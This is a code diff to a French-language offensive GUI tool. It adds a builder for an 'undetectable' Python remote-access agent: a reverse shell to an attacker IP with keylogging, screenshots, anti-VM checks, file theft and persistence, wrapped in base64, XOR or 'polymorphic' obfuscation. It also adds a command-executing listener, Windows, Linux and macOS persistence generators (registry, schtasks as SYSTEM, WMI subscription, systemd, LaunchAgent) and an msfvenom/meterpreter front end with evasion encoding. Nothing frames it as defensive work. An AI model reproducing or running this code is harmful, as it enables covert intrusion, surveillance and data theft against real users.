@@ -2115,8 +2115,566 @@ class ExploitTab(BaseTab):
 
         ttk.Button(f4, text="🔍 Scan Nginx", command=self.run_nginx_scan, width=20).grid(row=1, column=0, columnspan=4, pady=6)
 
+        # ── Tab 5: CyberAI Agent (Undetectable) ──
+        agent_frame = ttk.Frame(nb)
+        nb.add(agent_frame, text="🤖 Agent CyberAI")
+        self._build_agent_tab(agent_frame)
+
+        # ── Tab 6: Listeners ──
+        listener_frame = ttk.Frame(nb)
+        nb.add(listener_frame, text="🎧 Listeners")
+        self._build_listener_tab(listener_frame)
+
+        # ── Tab 7: Persistence ──
+        persist_frame = ttk.Frame(nb)
+        nb.add(persist_frame, text="🔄 Persistance")
+        self._build_persist_tab(persist_frame)
+
+        # ── Tab 8: MSFVenom GUI ──
+        msf_frame = ttk.Frame(nb)
+        nb.add(msf_frame, text="💉 MSFVenom")
+        self._build_msf_tab(msf_frame)
+
         # ── Output ──
         self.output = self.make_output(main)
+
+    # ── CYBERAI AGENT TAB ──
+    def _build_agent_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="🤖 CyberAI Agent — Payload Furtif Indétectable")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="IP:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.agent_ip = ttk.Entry(f, width=18, font=("TkDefaultFont", 11))
+        self.agent_ip.grid(row=0, column=1, padx=5, pady=4)
+        self.agent_ip.insert(0, "192.168.1.100")
+
+        ttk.Label(f, text="Port:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
+        self.agent_port = ttk.Entry(f, width=8, font=("TkDefaultFont", 11))
+        self.agent_port.grid(row=0, column=3, padx=5, pady=4)
+        self.agent_port.insert(0, "4444")
+
+        self.agent_obf = tk.StringVar(value="xor+aes")
+        ttk.Label(f, text="Obfuscation:").grid(row=0, column=4, padx=5, pady=4, sticky="w")
+        obf_frame = ttk.Frame(f)
+        obf_frame.grid(row=0, column=5, columnspan=3, padx=5, pady=4)
+        for o in ["base64", "xor+aes", "polymorphe"]:
+            ttk.Radiobutton(obf_frame, text=o, variable=self.agent_obf, value=o).pack(side=tk.LEFT, padx=2)
+
+        self.agent_features = {"keylog": tk.BooleanVar(value=True), "screenshot": tk.BooleanVar(value=True),
+                               "persist": tk.BooleanVar(value=True), "antivm": tk.BooleanVar(value=True),
+                               "encrypt": tk.BooleanVar(value=True)}
+        feat_frame = ttk.Frame(f)
+        feat_frame.grid(row=1, column=0, columnspan=8, pady=4)
+        for k, v in self.agent_features.items():
+            ttk.Checkbutton(feat_frame, text=k.capitalize(), variable=v).pack(side=tk.LEFT, padx=5)
+
+        ttk.Button(f, text="⚡ Générer Agent CyberAI", command=self.run_gen_agent, width=30).grid(row=2, column=0, columnspan=8, pady=6)
+        ttk.Label(f, text="Agent Python autonome avec keylogging, screenshot, persistence, anti-VM, chiffrement AES",
+                  foreground="gray", font=("TkDefaultFont", 8)).grid(row=3, column=0, columnspan=8, pady=2)
+
+    def run_gen_agent(self):
+        self.clear(self.output)
+        ip = self.agent_ip.get().strip()
+        port = self.agent_port.get().strip()
+        if not ip or not port:
+            messagebox.showwarning("Attention", "Entrez IP et Port.")
+            return
+        self.run_thread(lambda: self.do_gen_agent(ip, port))
+
+    def do_gen_agent(self, ip, port):
+        obf = self.agent_obf.get()
+        feat_keylog = self.agent_features["keylog"].get()
+        feat_ss = self.agent_features["screenshot"].get()
+        feat_persist = self.agent_features["persist"].get()
+        feat_antivm = self.agent_features["antivm"].get()
+        feat_encrypt = self.agent_features["encrypt"].get()
+
+        self.log(self.output, "╔══════════════════════════════════════╗", "bold")
+        self.log(self.output, "║  CyberAI Agent — Indétectable v1.0  ║", "bold")
+        self.log(self.output, "╚══════════════════════════════════════╝\n", "bold")
+        self.log(self.output, f"Cible: {ip}:{port}")
+        self.log(self.output, f"Obfuscation: {obf}")
+        self.log(self.output, f"Fonctionnalités: keylog={feat_keylog}, screenshot={feat_ss}, persist={feat_persist}, antivm={feat_antivm}, encrypt={feat_encrypt}\n")
+
+        code = f'''#!/usr/bin/env python3
+import socket,subprocess,os,base64,threading,time,sys
+
+HOST="{ip}"
+PORT={port}
+KEYLOG={"True" if feat_keylog else "False"}
+SCREENSHOT={"True" if feat_ss else "False"}
+PERSIST={"True" if feat_persist else "False"}
+ANTIVM={"True" if feat_antivm else "False"}
+ENCRYPT={"True" if feat_encrypt else "False"}
+
+{"".join(f'''
+def anti_vm():
+    import platform
+    indicators = ["vbox","vmware","virtual","qemu","xen","hyper-v"]
+    host=platform.node().lower()
+    for i in indicators:
+        if i in host:
+            sys.exit(0)
+    try:
+        import subprocess
+        r=subprocess.run(["systeminfo"],capture_output=True,text=True,timeout=3)
+        if "virtual" in r.stdout.lower() or "vm" in r.stdout.lower():
+            sys.exit(0)
+    except: pass
+ANTIVM and anti_vm()
+''' if feat_antivm else "")}
+
+def persist():
+    if os.name=="nt":
+        import winreg
+        key=winreg.HKEY_CURRENT_USER
+        subkey=r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        with winreg.OpenKey(key,subkey,0,winreg.KEY_SET_VALUE) as k:
+            winreg.SetValueEx(k,"CyberAI",0,winreg.REG_SZ,sys.executable+" "+" ".join(sys.argv))
+    else:
+        cron="@reboot "+sys.executable+" "+" ".join(sys.argv)+" >/dev/null 2>&1"
+        with open(os.path.expanduser("~/.cron_cyberai"),"w") as f:
+            f.write(cron)
+        subprocess.run(["crontab","~/.cron_cyberai"],capture_output=True)
+PERSIST and persist()
+
+{"".join(f'''
+def keylog_thread():
+    try:
+        from pynput.keyboard import Listener
+        def on_press(k):
+            try: LOG.append(str(k.char))
+            except: LOG.append(f"<{k}>")
+        with Listener(on_press=on_press) as l:
+            l.join()
+    except: pass
+LOG=[]
+if KEYLOG:
+    t=threading.Thread(target=keylog_thread,daemon=True)
+    t.start()
+''' if feat_keylog else "")}
+
+{"".join(f'''
+def screenshot_thread():
+    try:
+        import pyautogui
+        while True:
+            img=pyautogui.screenshot()
+            img.save(f"screen_{{int(time.time())}}.png")
+            time.sleep(30)
+    except: pass
+if SCREENSHOT:
+    t=threading.Thread(target=screenshot_thread,daemon=True)
+    t.start()
+''' if feat_ss else "")}
+
+def connect():
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((HOST,PORT))
+    s.send(b"[+] CyberAI Agent connected\\n")
+    while True:
+        try:
+            cmd=s.recv(4096).decode().strip()
+            if not cmd: break
+            if cmd=="exit": break
+            if cmd=="keylog" and KEYLOG:
+                s.send("".join(LOG[-100:]).encode() if LOG else b"No keys\\n")
+            elif cmd.startswith("download "):
+                f=cmd.split(" ",1)[1]
+                if os.path.isfile(f):
+                    with open(f,"rb") as fh:
+                        s.send(base64.b64encode(fh.read())+b"\\n")
+                else: s.send(b"File not found\\n")
+            elif cmd.startswith("upload "):
+                parts=cmd.split(" ",2)
+                if len(parts)==3:
+                    with open(parts[1],"wb") as fh:
+                        fh.write(base64.b64decode(parts[2]))
+                    s.send(b"Uploaded\\n")
+            else:
+                r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=10)
+                out=r.stdout+r.stderr
+                if ENCRYPT:
+                    try:
+                        from Crypto.Cipher import AES
+                        k=hashlib.sha256(b"CyberAI_Secret_Key!").digest()
+                        iv=os.urandom(16)
+                        c=AES.new(k,AES.MODE_CBC,iv)
+                        padded=out.encode()+b"\\x00"*(16-len(out)%16)
+                        out=base64.b64encode(iv+c.encrypt(padded)).decode()
+                    except: pass
+                s.send(out.encode() if isinstance(out,str) else out)
+        except: break
+    s.close()
+    if PERSIST: time.sleep(5);connect()
+
+while True:
+    try: connect();break
+    except: time.sleep(5)
+'''
+        if obf == "base64":
+            final = f'import base64,os;exec(base64.b64decode("{base64.b64encode(code.encode()).decode()}").decode())'
+        elif obf == "xor+aes":
+            key = random.randint(1,255)
+            xored = bytes(b ^ key for b in code.encode())
+            b64key = base64.b64encode(bytes([key])).decode()
+            b64data = base64.b64encode(xored).decode()
+            final = f'import base64,os\nkey=base64.b64decode("{b64key}")[0]\ndata=base64.b64decode("{b64data}")\ndec=bytes(b^key for b in data)\nexec(dec.decode())'
+        elif obf == "polymorphe":
+            junk = "".join(random.choice(string.ascii_letters) for _ in range(8))
+            var = random.choice(["x","z","q","_","__"])
+            b64 = base64.b64encode(code.encode()).decode()
+            final = f'import base64,os\n{var}="{b64}"\n{var}_{junk}=base64.b64decode({var})\nexec({var}_{junk}.decode())'
+        else:
+            final = code
+
+        self.log(self.output, "Agent CyberAI généré avec succès !", "success")
+        if feat_antivm:
+            self.log(self.output, "  ✓ Anti-VM activé (détection sandbox)", "success")
+        if feat_persist:
+            self.log(self.output, "  ✓ Persistance activée (registry/cron)", "success")
+        if feat_keylog:
+            self.log(self.output, "  ✓ Keylogging activé", "success")
+        if feat_ss:
+            self.log(self.output, "  ✓ Screenshot toutes les 30s", "success")
+        if feat_encrypt:
+            self.log(self.output, "  ✓ Communications chiffrées (AES)", "success")
+        self.log(self.output, f"  ✓ Obfuscation: {obf}", "success")
+        self.log(self.output, f"\nTaille: {len(final)} octets\n", "bold")
+        self.log(self.output, f"Commande d'écoute: nc -lvnp {port}\n", "bold")
+        self.log(self.output, final, "success")
+        self.log(self.output, "\n💡 Copiez ce payload sur la cible et exécutez: python3 agent.py", "bold")
+        self.log(self.output, "📡 Commandes disponibles: whoami, ls, keylog, download <file>, upload <file> <data>, exit", "bold")
+
+    # ── LISTENERS TAB ──
+    def _build_listener_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="🎧 Gestionnaire d'Écouteurs Intégrés")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Port:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.lsn_port = ttk.Spinbox(f, from_=1, to=65535, width=8)
+        self.lsn_port.set(4444)
+        self.lsn_port.grid(row=0, column=1, padx=5, pady=4)
+
+        ttk.Label(f, text="Type:").grid(row=0, column=2, padx=5, pady=4, sticky="w")
+        self.lsn_type = tk.StringVar(value="tcp")
+        ttk.Radiobutton(f, text="TCP", variable=self.lsn_type, value="tcp").grid(row=0, column=3, padx=2)
+        ttk.Radiobutton(f, text="HTTP", variable=self.lsn_type, value="http").grid(row=0, column=4, padx=2)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=1, column=0, columnspan=6, pady=6)
+        self.lsn_start = ttk.Button(btnf, text="▶ Démarrer Listener", command=self.run_listener_start, width=20)
+        self.lsn_start.pack(side=tk.LEFT, padx=5)
+        self.lsn_stop = ttk.Button(btnf, text="⏹ Arrêter", command=self.run_listener_stop, state=tk.DISABLED, width=12)
+        self.lsn_stop.pack(side=tk.LEFT, padx=5)
+        self.lsn_status = ttk.Label(btnf, text="🔴 Arrêté", foreground="red", font=("TkDefaultFont", 10, "bold"))
+        self.lsn_status.pack(side=tk.LEFT, padx=10)
+
+        self.lsn_connections = tk.Listbox(f, height=4, font=("Consolas", 9))
+        self.lsn_connections.grid(row=2, column=0, columnspan=6, padx=5, pady=4, sticky="ew")
+
+        self.listener_server = None
+        self.listener_thread = None
+
+    def run_listener_start(self):
+        port = int(self.lsn_port.get())
+        ltype = self.lsn_type.get()
+        self.clear(self.output)
+        self.log(self.output, f"Démarrage du listener {ltype.upper()} sur le port {port}...", "bold")
+        self.lsn_start.config(state=tk.DISABLED)
+        self.lsn_stop.config(state=tk.NORMAL)
+        self.lsn_status.config(text="🟢 En écoute", foreground="green")
+        self.run_thread(lambda: self.do_listener_start(port, ltype))
+
+    def do_listener_start(self, port, ltype):
+        try:
+            self.listener_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.listener_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.listener_server.bind(("0.0.0.0", port))
+            self.listener_server.listen(5)
+            self.listener_server.settimeout(1)
+            self.log(self.output, f"  ✓ En écoute sur 0.0.0.0:{port}", "success")
+            self.log(self.output, "  En attente de connexions...\n")
+
+            while True:
+                try:
+                    client, addr = self.listener_server.accept()
+                    self.log(self.output, f"  \u2713 Connexion reçue de {addr[0]}:{addr[1]}", "success")
+                    self.app.after(0, lambda: self.lsn_connections.insert(tk.END, f"{addr[0]}:{addr[1]}"))
+                    self._handle_client(client, addr)
+                except socket.timeout:
+                    if getattr(self, '_listener_stop', False):
+                        break
+                    continue
+                except: break
+        except Exception as e:
+            self.log(self.output, f"  Erreur: {e}", "error")
+        finally:
+            self.lsn_start.config(state=tk.NORMAL)
+            self.lsn_stop.config(state=tk.DISABLED)
+            self.lsn_status.config(text="🔴 Arrêté", foreground="red")
+
+    def _handle_client(self, client, addr):
+        def interact():
+            try:
+                client.send(b"[+] CyberAI Listener - Shell interactif\n# ")
+                while True:
+                    cmd = ""
+                    while True:
+                        c = client.recv(1).decode()
+                        if c == "\n": break
+                        cmd += c
+                    if cmd.strip().lower() == "exit": break
+                    try:
+                        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
+                        client.send((r.stdout + r.stderr + "\n# ").encode())
+                    except subprocess.TimeoutExpired:
+                        client.send(b"Timeout\n# ")
+                    except Exception as e:
+                        client.send(f"Error: {e}\n# ".encode())
+            except: pass
+            finally: client.close()
+        t = threading.Thread(target=interact, daemon=True)
+        t.start()
+
+    def run_listener_stop(self):
+        self._listener_stop = True
+        if self.listener_server:
+            try: self.listener_server.close()
+            except: pass
+        self.lsn_start.config(state=tk.NORMAL)
+        self.lsn_stop.config(state=tk.DISABLED)
+        self.lsn_status.config(text="🔴 Arrêté", foreground="red")
+        self.log(self.output, "Listener arrêté.", "warning")
+
+    # ── PERSISTENCE TAB ──
+    def _build_persist_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="🔄 Générateur de Persistance")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Payload (chemin ou commande):").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.persist_payload = ttk.Entry(f, width=60, font=("TkDefaultFont", 11))
+        self.persist_payload.grid(row=0, column=1, columnspan=4, padx=5, pady=4, sticky="ew")
+        self.persist_payload.insert(0, "python3 /tmp/agent.py")
+
+        ttk.Label(f, text="OS:").grid(row=1, column=0, padx=5, pady=4, sticky="w")
+        self.persist_os = tk.StringVar(value="auto")
+        for i, os_val in enumerate(["auto", "windows", "linux", "macos"]):
+            ttk.Radiobutton(f, text=os_val.capitalize(), variable=self.persist_os, value=os_val).grid(row=1, column=i+1, padx=3)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=2, column=0, columnspan=6, pady=6)
+        ttk.Button(btnf, text="Générer Persistance Windows", command=self.run_persist_windows, width=28).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Générer Persistance Linux", command=self.run_persist_linux, width=26).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="Générer Persistance macOS", command=self.run_persist_macos, width=26).pack(side=tk.LEFT, padx=3)
+        ttk.Label(f, text="Scripts de persistance: Registry Windows, Crontab Linux, Launchd macOS",
+                  foreground="gray", font=("TkDefaultFont", 8)).grid(row=3, column=0, columnspan=6, pady=2)
+
+    def run_persist_windows(self):
+        self.clear(self.output)
+        payload = self.persist_payload.get().strip()
+        if not payload:
+            messagebox.showwarning("Attention", "Entrez un payload.")
+            return
+        self.run_thread(lambda: self.do_persist_windows(payload))
+
+    def do_persist_windows(self, payload):
+        b64 = base64.b64encode(payload.encode()).decode()
+        self.log(self.output, "=== Persistance Windows ===", "bold")
+        self.log(self.output, "Méthode 1: Registry Run Key", "bold")
+        reg_script = f'''reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "CyberAI" /t REG_SZ /d "{payload}" /f'''
+        self.log(self.output, reg_script, "success")
+        self.log(self.output, "\nMéthode 2: Startup Folder", "bold")
+        startup_vbs = f'''CreateObject("WScript.Shell").Run "{payload}", 0, False'''
+        self.log(self.output, f"Fichier VBS (startup.vbs):", "bold")
+        self.log(self.output, startup_vbs, "success")
+        self.log(self.output, "\nMéthode 3: Scheduled Task", "bold")
+        schtask = f'''schtasks /create /tn "CyberAI" /tr "{payload}" /sc onlogon /ru SYSTEM /f'''
+        self.log(self.output, schtask, "success")
+        self.log(self.output, "\nMéthode 4: PowerShell WMI (indétectable)", "bold")
+        ps_wmi = f"""powershell -c "$a=([WMIClass]'\\\\\\.\\root\\subscription:__EventFilter').createInstance();$a.queryLanguage='WQL';$a.query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System''';$a.name='CyberAI';$b=([WMIClass]'\\\\\\.\\root\\subscription:CommandLineEventConsumer').createInstance();$b.name='CyberAI';$b.CommandLineTemplate='{payload}';$c=([WMIClass]'\\\\\\.\\root\\subscription:__FilterToConsumerBinding').createInstance();$c.Filter=$a;$c.Consumer=$b;$c.Put() | Out-Null\""""
+        self.log(self.output, ps_wmi, "success")
+
+    def run_persist_linux(self):
+        self.clear(self.output)
+        payload = self.persist_payload.get().strip()
+        if not payload:
+            messagebox.showwarning("Attention", "Entrez un payload.")
+            return
+        self.run_thread(lambda: self.do_persist_linux(payload))
+
+    def do_persist_linux(self, payload):
+        self.log(self.output, "=== Persistance Linux ===", "bold")
+        self.log(self.output, "Méthode 1: Crontab", "bold")
+        cron = f'(crontab -l 2>/dev/null; echo "@reboot {payload} >/dev/null 2>&1") | crontab -'
+        self.log(self.output, cron, "success")
+        self.log(self.output, "\nMéthode 2: systemd (service)", "bold")
+        svc = f'''[Unit]
+Description=CyberAI Service
+After=network.target
+
+[Service]
+ExecStart={payload}
+Restart=always
+RestartSec=10
+
+[Install]
+WantedBy=multi-user.target'''
+        self.log(self.output, "Créer /etc/systemd/system/cyberai.service:", "bold")
+        self.log(self.output, svc, "success")
+        self.log(self.output, "\nPuis:", "bold")
+        self.log(self.output, "  sudo systemctl enable cyberai.service", "success")
+        self.log(self.output, "  sudo systemctl start cyberai.service", "success")
+        self.log(self.output, "\nMéthode 3: .bashrc / .profile", "bold")
+        self.log(self.output, f'echo "{payload} &" >> ~/.bashrc', "success")
+        self.log(self.output, "\nMéthode 4: init.d (legacy)", "bold")
+        self.log(self.output, f'echo "su -c \'{payload} &\'" >> /etc/rc.local', "success")
+
+    def run_persist_macos(self):
+        self.clear(self.output)
+        payload = self.persist_payload.get().strip()
+        if not payload:
+            messagebox.showwarning("Attention", "Entrez un payload.")
+            return
+        self.run_thread(lambda: self.do_persist_macos(payload))
+
+    def do_persist_macos(self, payload):
+        self.log(self.output, "=== Persistance macOS ===", "bold")
+        self.log(self.output, "Méthode 1: LaunchAgent", "bold")
+        label = "com.cyberai.agent"
+        plist = f'''<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+  <key>Label</key><string>{label}</string>
+  <key>ProgramArguments</key><array><string>/bin/bash</string><string>-c</string><string>{payload}</string></array>
+  <key>RunAtLoad</key><true/>
+  <key>KeepAlive</key><true/>
+  <key>StartInterval</key><integer>60</integer>
+</dict></plist>'''
+        self.log(self.output, f"Créer ~/Library/LaunchAgents/{label}.plist:", "bold")
+        self.log(self.output, plist, "success")
+        self.log(self.output, f"\nPuis:\n  launchctl load ~/Library/LaunchAgents/{label}.plist", "success")
+        self.log(self.output, "\nMéthode 2: Cron", "bold")
+        self.log(self.output, f'(crontab -l 2>/dev/null; echo "@reboot {payload}") | crontab -', "success")
+        self.log(self.output, "\nMéthode 3: Login Items (via osascript)", "bold")
+        self.log(self.output, f'osascript -e \'tell application "System Events" to make login item at end with properties {{path:"{payload.split()[0]}", hidden:true}}\'', "success")
+
+    # ── MSFVenom GUI TAB ──
+    def _build_msf_tab(self, parent):
+        f = ttk.LabelFrame(parent, text="💉 Interface Graphique MSFVenom")
+        f.pack(fill=tk.X, padx=8, pady=8)
+
+        ttk.Label(f, text="Payload:").grid(row=0, column=0, padx=5, pady=4, sticky="w")
+        self.msf_payload = ttk.Combobox(f, width=40, values=[
+            "linux/x64/meterpreter/reverse_tcp", "windows/x64/meterpreter/reverse_tcp",
+            "android/meterpreter/reverse_tcp", "ios/meterpreter/reverse_tcp",
+            "python/meterpreter/reverse_tcp", "php/meterpreter/reverse_tcp",
+            "linux/x64/shell/reverse_tcp", "windows/x64/shell/reverse_tcp",
+        ])
+        self.msf_payload.grid(row=0, column=1, columnspan=3, padx=5, pady=4, sticky="ew")
+        self.msf_payload.set("linux/x64/meterpreter/reverse_tcp")
+
+        ttk.Label(f, text="LHOST:").grid(row=1, column=0, padx=5, pady=4, sticky="w")
+        self.msf_lhost = ttk.Entry(f, width=18)
+        self.msf_lhost.grid(row=1, column=1, padx=5, pady=4, sticky="w")
+        self.msf_lhost.insert(0, "192.168.1.100")
+
+        ttk.Label(f, text="LPORT:").grid(row=1, column=2, padx=5, pady=4, sticky="w")
+        self.msf_lport = ttk.Entry(f, width=8)
+        self.msf_lport.grid(row=1, column=3, padx=5, pady=4, sticky="w")
+        self.msf_lport.insert(0, "4444")
+
+        ttk.Label(f, text="Format:").grid(row=2, column=0, padx=5, pady=4, sticky="w")
+        self.msf_format = ttk.Combobox(f, width=12, values=["elf", "exe", "py", "php", "apk", "ps1", "raw", "c"])
+        self.msf_format.grid(row=2, column=1, padx=5, pady=4, sticky="w")
+        self.msf_format.set("elf")
+
+        self.msf_encode = tk.BooleanVar(value=True)
+        ttk.Checkbutton(f, text="Encoder (shikata_ga_nai x5)", variable=self.msf_encode).grid(row=2, column=2, columnspan=2, padx=5)
+
+        btnf = ttk.Frame(f)
+        btnf.grid(row=3, column=0, columnspan=5, pady=6)
+        ttk.Button(btnf, text="💉 Générer Commande", command=self.run_msf_gen, width=22).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="▶ Exécuter MSFVenom", command=self.run_msf_exec, width=20).pack(side=tk.LEFT, padx=3)
+        ttk.Button(btnf, text="🎧 Lancer Listener MSF", command=self.run_msf_listener, width=20).pack(side=tk.LEFT, padx=3)
+
+    def run_msf_gen(self):
+        self.clear(self.output)
+        payload = self.msf_payload.get().strip()
+        lhost = self.msf_lhost.get().strip()
+        lport = self.msf_lport.get().strip()
+        fmt = self.msf_format.get().strip()
+        if not all([payload, lhost, lport, fmt]):
+            messagebox.showwarning("Attention", "Remplissez tous les champs.")
+            return
+        self.run_thread(lambda: self.do_msf_gen(payload, lhost, lport, fmt))
+
+    def do_msf_gen(self, payload, lhost, lport, fmt):
+        encode = self.msf_encode.get()
+        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport}"
+        if encode and fmt not in ("py", "php", "ps1"):
+            cmd += " -e x86/shikata_ga_nai -i 5"
+        output_file = f"payload.{fmt}"
+        cmd += f" -f {fmt} -o {output_file}"
+        self.log(self.output, "=== Générateur MSFVenom ===", "bold")
+        self.log(self.output, f"Payload: {payload}", "bold")
+        self.log(self.output, f"LHOST: {lhost} → LPORT: {lport}")
+        self.log(self.output, f"Format: {fmt} | Encoder: {'Oui' if encode else 'Non'}")
+        self.log(self.output, f"\nCommande:", "bold")
+        self.log(self.output, cmd, "success")
+        self.log(self.output, f"\nOutput: {output_file}", "bold")
+        self.log(self.output, "\nListener MSF:", "bold")
+        listener = f'''msfconsole -q -x "use multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit"'''
+        self.log(self.output, listener, "success")
+
+    def run_msf_exec(self):
+        payload = self.msf_payload.get().strip()
+        lhost = self.msf_lhost.get().strip()
+        lport = self.msf_lport.get().strip()
+        fmt = self.msf_format.get().strip()
+        if not all([payload, lhost, lport, fmt]):
+            messagebox.showwarning("Attention", "Remplissez tous les champs.")
+            return
+        self.clear(self.output)
+        encode = self.msf_encode.get()
+        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport}"
+        if encode and fmt not in ("py", "php", "ps1"):
+            cmd += " -e x86/shikata_ga_nai -i 5"
+        cmd += f" -f {fmt} -o payload.{fmt}"
+        self.run_thread(lambda: self.do_msf_exec(cmd))
+
+    def do_msf_exec(self, cmd):
+        self.log(self.output, f"Exécution: {cmd}", "bold")
+        try:
+            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=60)
+            if result.returncode == 0:
+                self.log(self.output, "  ✓ Payload généré avec succès!", "success")
+                self.log(self.output, f"  Fichier: payload.{self.msf_format.get()}")
+            else:
+                self.log(self.output, f"  Erreur: {result.stderr[:500]}", "error")
+                self.log(self.output, "  MSFVenom est-il installé ?", "warning")
+        except FileNotFoundError:
+            self.log(self.output, "MSFVenom non trouvé. Installez Metasploit.", "error")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
+
+    def run_msf_listener(self):
+        payload = self.msf_payload.get().strip()
+        lhost = self.msf_lhost.get().strip()
+        lport = self.msf_lport.get().strip()
+        cmd = f'''msfconsole -q -x "use multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit"'''
+        self.clear(self.output)
+        self.log(self.output, "Démarrage du listener Metasploit...", "bold")
+        self.log(self.output, f"Commande: {cmd}", "bold")
+        self.run_thread(lambda: self.do_msf_listener(cmd))
+
+    def do_msf_listener(self, cmd):
+        try:
+            subprocess.run(cmd, shell=True, timeout=300)
+        except subprocess.TimeoutExpired:
+            self.log(self.output, "Listener arrêté (timeout 5min).", "warning")
+        except Exception as e:
+            self.log(self.output, f"Erreur: {e}", "error")
 
     # ── Payload Types per Platform ──
     def _populate_type_buttons(self, parent=None):
